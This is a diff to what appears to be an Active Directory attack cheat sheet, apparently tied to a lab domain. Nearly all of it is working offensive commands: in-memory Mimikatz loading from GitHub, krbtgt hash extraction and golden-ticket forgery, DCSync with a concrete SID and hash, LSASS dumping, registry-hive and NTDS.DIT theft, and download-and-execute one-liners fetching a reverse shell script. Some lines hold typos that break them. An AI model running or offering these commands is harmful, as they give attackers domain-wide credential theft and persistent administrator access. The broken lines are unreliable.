@@ -158,10 +158,40 @@ Mimikatz PowerShell Script
 1) Invoke-Mimikatz -DumpCreds
 2) Invoke-Mimikatz -DumpCreds -ComputerName@("comp1","comp2")
 3) Pass-the-hash attack: Invoke-Mimikatz -Command "securlsa::pth /user:Administrator /domain:<domain> /hash:<hash> /run:powershell.exe"
+......................................................................................................................................
+## Mimikatz from memory in DC:
 
+IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/phra/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1")))
+$(Invoke-Mimikatz -Command ’"lsadump::lsa /inject /name:krbtgt"’) *>&1 > output.txt
+$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’’)[2] ; }
+$tdomain = $tdomain + ’.local’
+$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’ ’)[4] ; }
+$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first 1 | %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
+$write = "Invoke-Mimikatz -Command ‘’‘"kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt‘"‘’ "
+$(echo $write) *>&1 > temp_mem.ps1
+.\temp_mem.ps1
+......................................................................................................................................
+## DCSync with Kiwi:
+
+load kiwi
+dcsync_ntlm krbtgt
+golden_ticket_create -d wazuh.local -u Administrator -s S-1-5-21-3307301586-4221688441-1196996515-502 -k ec9183c701e861eda574d85939d635cd -t /tmp/golden.tck
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## GOLDEN/SILVER TICKET
-
+..............................................................................................
+$(.\mimikatz.exe privilege::debug "lsadump::lsa /inject /name:krbtgt", exit ) *>&1 > output.txt
+$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’, ’)[2] ; }
+$tdomain = $tdomain + ’.local’
+$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(’ ’),[4] ; }
+$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first, 1 | %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
+.\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
+.................................................................................................................................
+## Mimikatz with DCSync:
+$(.\x64\mimikatz.exe "lsadump::dcsync /user:krbtgt" exit) *>&1 > output.txt
+$tdomain = Get-Content .\output.txt | findstr Salt |Select-Object -first 1| %{ $_.Split(’:’)[1] ; }| %{ $_.Split(’krbtgt’)[0] ;}| %{ $_.Split(’ ’)[1] ; }
+$sid = Get-Content .\output.txt | findstr Object | findstr Security| %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
+$ntlm = Get-Content .\output.txt | findstr Hash| findstr NTLM| %{ $_.Split(’:’)[1] ; } | %{ $_.Split(’ ’)[1] ; }
+.\x64\mimikatz.exe privilege::debug "kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt" exit
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ## POWERSHELL IN-MEMORY DOWNLOAD AND EXECUTE
 1) iex(iwr'http://ip/file.ps1')
@@ -170,6 +200,33 @@ Mimikatz PowerShell Script
 4) iex(New-Object Net.WebClient).DownloadString('http://ip/reverse.ps1')
 5) $ie=Nwe-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://ip/reverse.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Retrieval of NTDS.DIT with ntdsutil
+ntdsutil "activate instance ntds" ifm "create full C:\temp\ntdsutil" quit quit
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Storing registry hives with Reg:
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Dump of LSASS with ProcDump:
+C:\Users\Administrator\Downloads\procdump.exe -accepteula -64 -ma lsass.exe c:\temp\lsass.dmp
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Dump of LSASS with pd:
+C:\Users\Administrator\Downloads\pd.exe -p 552 > c:\temp\lsass.dump
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Dump of LSASS with Minidump:
+Import-Module c:\users\administrator\downloads\PowerSploit-master\Exfiltration\Out-Minidump.ps1
+Get-Process lsass | Out-Minidump -DumpFilePath c:\temp
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Retrieval of NTDS.DIT with NinjaCopy:
+Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit"
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Or to copy the NTDS.DIT of the DC in this laboratory to a no-DC computer:
+Import-Module C:\Users\Administrator\Downloads\PowerSploit-master\Exfiltration\Invoke-NinjaCopy.ps1
+Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\temp\ntds.dit" -ComputerName "WIN-25U0PFAB511"
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
 PowerShell-Remoting 
 
 Enter-PSSession -ComputerName <computername> -Credentials <domain>\username
@@ -178,8 +235,6 @@ Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <computername> -Cred
 $session = New-PSSession -ComputerName <computer name> -verbose
 Enter-PSSession -Session $session -Verbose
 Invoke-Command -Session $session -ScriptBlock {whoami;hostname} -Verbose
-
-
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Unconstrained delegation
 
